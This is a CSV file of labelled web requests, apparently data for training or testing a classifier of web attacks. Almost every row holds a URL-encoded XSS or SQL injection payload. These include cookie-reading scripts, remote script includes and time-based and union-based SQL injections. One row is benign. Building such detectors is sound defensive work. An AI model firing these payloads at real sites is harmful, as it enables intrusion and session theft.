text,label
/api/v1/search?q=%29+or+%271%C3%A2%E2%82%AC%C2%B2%3D%271%C3%A2%E2%82%AC%E2%80%9C,sql_injection
/api/v1/comments?text=%3Cinput+onpaste%3Dalert%281%29+value%3D%22%22+autofocus%3E,xss
/api/v1/reviews?body=%3Cvar+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fvar%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cdatalist+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fdatalist%3E,xss
/api/v2/comments/%3Cmark+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fmark%3E,xss
/api/v2/comments/%3Cnoembed+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnoembed%3E,xss
/api/v2/comments/%3Cvar+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fvar%3E,xss
/api/v1/feedback?message=%3Cbody+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fbody%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Carea+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Farea%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/reviews?body=%3Ctt+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Ftt%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Ccolgroup+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fcolgroup%3E,xss
/v1/search?q=%3Cmeta+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fmeta%3E,xss
/api/v2/comments/%3Ccode+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcode%3E,xss
/v1/search?q=%3Clabel+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Flabel%3E,xss
/api/v1/reviews?body=%3Ciframe+id%3D%2522ifra%2522+src%3D%2522%2F%2522%3E%3C%2Fiframe%3E+%3Cscript%3Eifr+%3D+document.getElementById%28%27ifra%27%29%3B+ifr.contentDocument.write%28%2522%3Cscr%2522+%252b+%2522ipt%3Etop.foo+%3D+Object.defineProperty%3C%2Fscr%2522+%252b+%2522ipt%3E%2522%29%3B+foo%28window%2C+%27Safe%27%2C+%7Bvalue%3A%7B%7D%7D%29%3B+foo%28Safe%2C+%27get%27%2C+%7Bvalue%3Afunction%28%29+%7B++++return+document.cookie+%7D%7D%29%3B+alert%28Safe.get%28%29%29%3B%3C%2Fscript%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctitle+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Ftitle%3E,xss
/api/v1/login?username=%22%29%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&password=pass,sql_injection
/api/v1/reviews?body=%3Ccol+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fcol%3E,xss
/api/v1/feedback?message=%3Csvg%3E%3Capplet+onload%3Dalert%281%29%3E%3C%2Fapplet%3E,xss
/api/v2/profile?id=%3Cruby+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fruby%3E,xss
/api/v2/profile?id=%3Cdata+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fdata%3E,xss
/api/v1/feedback?message=%3C%21a+foo%3Dx%3D%60y%3E%3Cimg+alt%3D%22%60%3E%3Cimg+src%3Dxx%3Ax+onerror%3Dalert%282%29%2F%2F%22%3E,xss
/v1/profile?bio=%3Cscript%3EObject.defineProperty%28window%2C+%27Safe%27%2C+%7Bvalue%3A%7B%7D%7D%29%3BObject.defineProperty%28Safe%2C+%27get%27%2C+%7Bvalue%3Afunction%28%29+%7Breturn+document.cookie%7D%7D%29%3Balert%28Safe.get%28%29%29%3C%2Fscript%3E,xss
/v1/products/%22+or+1%3D1%2F%2A,sql_injection
/api/v2/comments/%3Ccode+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcode%3E,xss
/v1/orders?customer_id=%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&status=active,sql_injection
/v1/search?q=%3Cscript%3E+location.href+%3D+%27data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio%2FKScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4%3D%27%3B+%3C%2Fscript%3E,xss
/api/v1/feedback?message=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cp+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fp%3E,xss
/api/v2/items/UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14?key=API_KEY,sql_injection
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cu+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fu%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cmap+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fmap%3E,xss
/api/v2/comments/%3Cbr%2F%3E%3Chr%2F%3EjAvascript%3Aalert%28%27Top+Page+Location%3A+%27%2Bdocument.location%2B%27+Host+Page+Cookies%3A+%27%2Bdocument.cookie%29%3B%2F%2F%3Cbr%2F%3E%3Chr%2F%3E,xss
/api/v2/items/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12?key=API_KEY,sql_injection
/v1/orders?customer_id=limit&status=active,sql_injection
/v1/search?q=%3Cstrong+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fstrong%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ccode+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fcode%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Caddress+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Faddress%3E,xss
/v1/products/%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--,sql_injection
/api/v2/profile?id=%3Cdir+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/api/v2/profile?id=%3Cu+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fu%3E,xss
/api/v2/comments/%3Cbgsound+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fbgsound%3E,xss
/v1/products/%27+or+user+like+%27%25,sql_injection
/v1/search?q=%3Cmeta+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeta%3E,xss
/api/v1/comments?text=%3Cnobr+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnobr%3E,xss
/api/v2/profile?id=%3Crb+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Frb%3E,xss
/api/v2/comments/%3Cp+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fp%3E,xss
/v1/search?q=%3Ccommand+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fcommand%3E%3Cinput+autofocus%3E,xss
/api/v1/search?q=having+1%3D1--,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Clegend+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Flegend%3E,xss
/api/v2/comments/%3Cx+onmouseout%3Dalert%281%29%3Ehover+this%21,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cbasefont+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fbasefont%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Crtc+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Frtc%3E,xss
/api/v2/comments/%3Cmap+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fmap%3E,xss
/api/v1/feedback?message=%3Ccode+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcode%3E,xss
/api/v2/profile?id=%3Ctrack+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftrack%3E,xss
/api/v2/comments/%3Ca+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fa%3E,xss
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cmenu+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fmenu%3E,xss
/api/v1/reviews?body=%3Cdfn+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fdfn%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Clabel+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Flabel%3E,xss
/api/v2/comments/%3Cdiv+id%3D%2254%22%3E%3Cscript%3E%5B%7B%27a%27%3AObject.prototype.__defineSetter__%28%27b%27%2Cfunction%28%29%7Balert%28arguments%5B0%5D%29%7D%29%2C%27b%27%3A%5B%27secret%27%5D%7D%5D%3C%2Fscript%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2255%22%3E%3Cvideo%3E%3Csource+onerror%3D%22alert%2855%29%22%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2256%22%3E%3Cvideo+onerror%3D%22alert%2856%29%22%3E%3Csource%3E%3C%2Fsource%3E%3C%2Fvideo%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2257%22%3E%3Cb+%3Cscript%3Ealert%2857%29%2F%2F%3C%2Fscript%3E0%3C%2Fscript%3E%3C%2Fb%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2258%22%3E%3Cb%3E%3Cscript%3Cb%3E%3C%2Fb%3E%3Calert%2858%29%3C%2Fscript+%3C%2Fb%3E%3C%2Fb%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2259%22%3E%3Cdiv+id%3D%22div1%22%3E%3Cinput+value%3D%22%60%60onmouseover%3Dalert%2859%29%22%3E%3C%2Fdiv%3E+%3Cdiv+id%3D%22div2%22%3E%3C%2Fdiv%3E%3Cscript%3Edocument.getElementById%28%22div2%22%29.innerHTML+%3D+document.getElementById%28%22div1%22%29.innerHTML%3B%3C%2Fscript%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2260%22%3E%3Cdiv+style%3D%22%5Ba%5Dcolor%5Bb%5D%3A%5Bc%5Dred%22%3EXXX%3C%2Fdiv%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/v1/products/UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23,sql_injection
/api/v1/feedback?message=%3Cmark+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmark%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cq+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fq%3E,xss
/api/v1/feedback?message=%3Cscript+src%3D%2F%2Fbrutelogic.com.br%2F1.js%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cpre+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fpre%3E,xss
/v1/search?q=%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cxmp+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fxmp%3E,xss
/api/v1/comments?text=%3Ciframe+onreadystatechange%3Dalert%281%29%3E%3C%2Fiframe%3E,xss
/api/v1/comments?text=%3Cbdo+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fbdo%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cnextid+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnextid%3E,xss
/v1/profile?bio=%3Cdialog+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fdialog%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cparam+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fparam%3E,xss
/api/v1/comments?text=%3Cblockquote+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fblockquote%3E,xss
/api/v2/comments/%3Cs+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fs%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Caudio+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Faudio%3E,xss
/v1/search?q=%3Cslot+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fslot%3E,xss
/api/v2/items/asc?key=API_KEY,sql_injection
/v1/search?q=%3Caside+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Faside%3E,xss
/api/v1/reviews?body=%3Coptgroup+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Foptgroup%3E,xss
/api/v2/profile?id=%3Cvideo+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fvideo%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Clisting+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/api/v2/profile?id=%3Cmarquee+width%3D1+loop%3D1+onbounce%3Dalert%281%29%3EXSS%3C%2Fmarquee%3E,xss
/api/v2/comments/%3Cbdo+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fbdo%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Ctable+onclick%3D%22alert%281%29%22%3Etest%3C%2Ftable%3E,xss
/api/v1/comments?text=%3Cdiv+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fdiv%3E,xss
/v1/profile?bio=%3Cscript+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ccol+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fcol%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4,sql_injection
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cmenu+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fmenu%3E,xss
/v1/search?q=%3Cblink+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fblink%3E,xss
/api/v1/comments?text=%3Cmulticol+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fmulticol%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cnobr+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fnobr%3E,xss
/api/v1/feedback?message=%3Ctime+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Ftime%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cabbr+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fabbr%3E,xss
/api/v1/comments?text=%3Cframe+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fframe%3E,xss
/api/v1/users?id=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28column_name%29+FROM+%28SELECT+DISTINCT%28column_name%29%2C+ROWNUM+AS+LIMIT+FROM+all_tab_columns%29+WHERE+LIMIT%3D8%29%29+AND+%27i%27%3D%27i,sql_injection
/api/v2/profile?id=%3Csvg%3E%3Cdiv+onload%3Dalert%281%29%3E%3C%2Fdiv%3E,xss
/api/v2/comments/%3Cspan+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspan%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cnoscript+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fnoscript%3E,xss
/api/v2/search?q=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15&key=API_KEY,sql_injection
/api/v1/feedback?message=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E,xss
/api/v2/comments/%3Cbody+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fbody%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cruby+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fruby%3E,xss
/api/v1/reviews?body=%3Cnobr+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnobr%3E,xss
/api/v1/comments?text=%3Ciframe+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fiframe%3E,xss
/v1/search?q=%3Cvar+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fvar%3E,xss
/v1/search?q=%3Cframeset+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fframeset%3E,xss
/v1/profile?bio=%3Csamp+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fsamp%3E,xss
/api/v1/feedback?message=%3Cframe+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fframe%3E,xss
/v1/profile?bio=%3Crp+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Frp%3E,xss
/v1/products/%C3%A2%E2%82%AC%CB%9C+or+3%3D3+--,sql_injection
/api/v1/reviews?body=%3Cembed+src%3D%2F+onload%3Dalert%281%29%3E,xss
/api/v1/login?username=%5Cx27UNION+SELECT&password=pass,sql_injection
/v1/profile?bio=%3Cpicture+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fpicture%3E,xss
/api/v2/items/or+3%3D3?key=API_KEY,sql_injection
/v1/profile?bio=%3Cdfn+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fdfn%3E,xss
/v1/search?q=%3Cmeta+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fmeta%3E,xss
/api/v2/profile?id=%3Cshadow+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fshadow%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cimage+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fimage%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cbdo+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fbdo%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Csub+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fsub%3E,xss
/api/v1/users?id=0,sql_injection
/api/v1/feedback?message=%3Caddress+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Faddress%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cframeset+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fframeset%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cshadow+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fshadow%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cscript+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fscript%3E,xss
/api/v1/users?id=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%23,sql_injection
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctextarea+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Ftextarea%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Carea+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Farea%3E,xss
/v1/profile?bio=%3Ccontent+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fcontent%3E,xss
/api/v1/comments?text=%3Ccommand+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fcommand%3E,xss
/api/v2/profile?id=%3Chgroup+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fhgroup%3E,xss
/api/v1/feedback?message=%3Cstrike+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fstrike%3E,xss
/api/v1/feedback?message=%3Cimage+xlink%3Ahref%3D%22data%3Aimage%2Fsvg%2Bxml%2C%253Csvg+xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27+onload%3D%27alert%2888%29%27%253E%253C%2Fsvg%253E%22%2F%3E,xss
/api/v2/profile?id=%3Cmulticol+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmulticol%3E,xss
/api/v1/users?id=%22+or+1%3D1--,sql_injection
/api/v1/reviews?body=%3Cisindex+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fisindex%3E,xss
/v1/profile?bio=%3Ch1+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fh1%3E,xss
/api/v2/comments/%3Ctextarea+onbeforepaste%3Dalert%281%29+autofocus%3E%3C%2Ftextarea%3E,xss
/api/v2/comments/%3Cheader+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fheader%3E,xss
/api/v2/comments/%3Cimage+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fimage%3E,xss
/api/v2/items/%22%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--?key=API_KEY,sql_injection
/v1/orders?customer_id=ORDER+BY+SLEEP%285%29--&status=active,sql_injection
/api/v1/orders/green%2Blaptop,benign
/api/v2/profile?id=%3Cfigcaption+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Ffigcaption%3E,xss
/api/v1/feedback?message=%3Chr+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,xss
/v1/search?q=%3Ctbody+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Ftbody%3E,xss
/api/v1/reviews?body=%3Clegend+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Flegend%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16&status=active,sql_injection
/api/v1/comments?text=%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%3E,xss
/api/v1/search?q=or+1%3D1%C3%A2%E2%82%AC%E2%80%9C,sql_injection
/v1/search?q=%3Crp+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Frp%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cq+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fq%3E,xss
